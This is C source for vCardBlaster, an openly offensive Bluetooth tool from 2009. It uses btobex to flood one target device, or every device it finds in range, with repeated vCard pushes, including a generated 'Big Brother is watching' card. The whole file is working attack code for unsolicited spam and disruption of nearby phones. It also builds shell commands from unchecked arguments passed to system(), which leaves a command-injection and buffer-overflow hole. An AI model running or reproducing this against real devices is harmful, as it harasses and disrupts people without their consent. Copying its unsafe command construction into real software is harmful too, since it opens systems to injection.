/* 
   vCardBlaster 
   Copyright (C) 2009 Shadow Cave LLC

   Written 2009 by JP Dunning (.ronin)
   ronin@shadowcave.org
   <www.hackfromacave.com>
 
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License version 2 as
   published by the Free Software Foundation;

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
   OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS.
   IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE FOR ANY 
   CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES 
   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
   OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN 
   CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

   ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS, 
   COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE IS 
   DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>


// Help for blueper
int ShowHelp()
{	
	printf("\nvCardBlaster v0.4 by John P Dunning <ronin@shadowcave.org>\n(c) ShadowCave LLC.\n");
	printf("\n");
	printf("NAME\n");
	printf("   vCardBlaster\n\n");
	printf("SYNOPSIS\n");
	printf("   vcblaster [-t times] [options] [vcard] [target] \n\n");
	printf("DESCRIPTION\n");
	printf("   [btaddr]\t\tAddress of the target device.  Format: XX:XX:XX:XX:XX:XX\n");
	printf("   -a\t\t\tSend vCard to all devices in range\n");
	printf("   -g\t\t\tGenerate random vCard\n");
	printf("   -h\t\t\tHelp\n");
	printf("   -i [iterations]\tNumber of iterations to send vCard. Default: 10\n");
	printf("   -t [time]\t\tTime in seconds to hang before sending again.\n");
	printf("   -v [vcard]\t\tSpecify vcard location\n");
	printf("\n");

	return 0;
}

// Used to generate vCard
int GeneratevCard(char * name)
{
	
	FILE *fp;
	
	// Create file
	if((fp = fopen(name, "w")) == NULL)
		return 1;

	fprintf(fp, "BEGIN:VCARD\n");
	fprintf(fp, "VERSION:2.1\n");
//	fprintf(fp, "REV: 20090423T045835\n");
	fprintf(fp, "CATEGORIES: Watchers\n");
	fprintf(fp, "N: Big Brother %c%c%c%c%c%c\n", rand()%255, rand()%255, rand()%255, rand()%255, rand()%255, rand()%255);
	fprintf(fp, "TITLE: Big Brother is watching :)\n");
	fprintf(fp, "END:VCARD\n");
	
	fclose (fp);
	return 0;
}

int SendvCardAll(char * vcard, int times, int genfile, char * wait_time)
{
	inquiry_info *ii = NULL;
	int max_rsp, num_rsp;
	int dev_id, sock, len, flags;
	int i;
	int t_count;
	char addr[19] = { 0 };
	char name[248] = { 0 };
	
	dev_id = hci_get_route(NULL);
	sock = hci_open_dev( dev_id );
	if (dev_id < 0 || sock < 0) {
		perror("error: opening socket");
		return 1;
	}
	
	len  = 8;
	max_rsp = 255;
	flags = IREQ_CACHE_FLUSH;
	ii = (inquiry_info*)malloc(max_rsp * sizeof(inquiry_info));
	
	num_rsp = hci_inquiry(dev_id, len, max_rsp, NULL, &ii, flags);
	if( num_rsp < 0 ) {
		perror("error: no devices found");
		return 1;
	}
	
	for (t_count; t_count < times; t_count++) {
		for (i = 0; i < num_rsp; i++) {
			ba2str(&(ii+i)->bdaddr, addr);
			memset(name, 0, sizeof(name));

			if (hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0) < 0)
				strcpy(name, "[unknown]");

			printf("Sending vCard to %s [%s]. \n", name, addr);

			SendvCardAllCall(addr, vcard, genfile, wait_time);
		}
	}
	
	free( ii );
	close( sock );
	return 0;
}

int SendvCardAllCall(char * target, char * vcard, int genfile, char * wait_time)
{

	char command[255] = "timeout ";
	strcat(command, wait_time);
	strcat(command," btobex -i hci0 push ");
	strcat(command, target);
	strcat(command, " ");
	
	if (genfile == 1) {
		vcard = "/etc/bluetooth/tempvcard.vcf";
		GeneratevCard(vcard);
	}
	
	strcat(command, vcard);
	
//	printf("%s\n", command);

	// Exicute btobex command
	system(command);

	return 0;
}

int SendvCard(char * target, char * vcard, int times, int genfile, char * wait_time)
{

	int i = 0;

	// Run 'times' number of times
	while (i < times) {

		char command[255] = "timeout ";
		strcat(command, wait_time);
		strcat(command," btobex -i hci0 push ");
		strcat(command, target);
		strcat(command, " ");
		
		if (genfile == 1) {
			vcard = "/etc/bluetooth/tempvcard.vcf";
			GeneratevCard(vcard);
		}
		
		strcat(command, vcard);
		
//		printf("%i: %s\n", i, command);
		printf("Sending vCard to [%s]. \n", target);

		// Exicute btobex command
		system(command);

		// Increment counter
		i++;
	}
	
	return 0;
}

int main(int argc, char **argv)
{
	char * target;
	char * file;
	char * vcard = "BigBrother.vcf";
	int alldevs = 0;
	int times = 10;
	char * wait_time = "10";
	int i = 1;
	int alltags = 0;
	int genfile = 0;

	//for (int i = 1; i < argc; i++) {
	while (i < argc) {
		if (strcmp(argv[i], "-h") == 0) {
			ShowHelp();
			return 0;
		} else if ((strlen(argv[i]) == 12) || (strlen(argv[i]) == 17)) {
			target = argv[i];
		} else if (strcmp(argv[i], "-v") == 0) {
			if (++i < argc)
				vcard = argv[i];
		} else if (strcmp(argv[i], "-i") == 0) {
			if (++i < argc)
				times = atoi(argv[i]);
		} else if (strcmp(argv[i], "-t") == 0) {
			if (++i < argc)
				wait_time = argv[i];
		} else if (strcmp(argv[i], "-a") == 0) {
			alldevs = 1;
		} else if (strcmp(argv[i], "-g") == 0) {
			genfile = 1;
		} else {
			ShowHelp();
			return 1;
		}

		i++;
	}

	// Check to make sure correct flags are set
	if ((((strlen(target) == 12) || (strlen(target) == 17)) || (alldevs > 0)) && ((strlen(vcard) > 0) || (genfile > 0) ) && ((times > 0)&&(times < 2000000))) {
		if (alldevs == 0)
			SendvCard(target, vcard, times, genfile, wait_time);
		else
			SendvCardAll(vcard, times, genfile, wait_time);
	}
	else {
		ShowHelp();
		return 0;
	}
	return 0;
} 

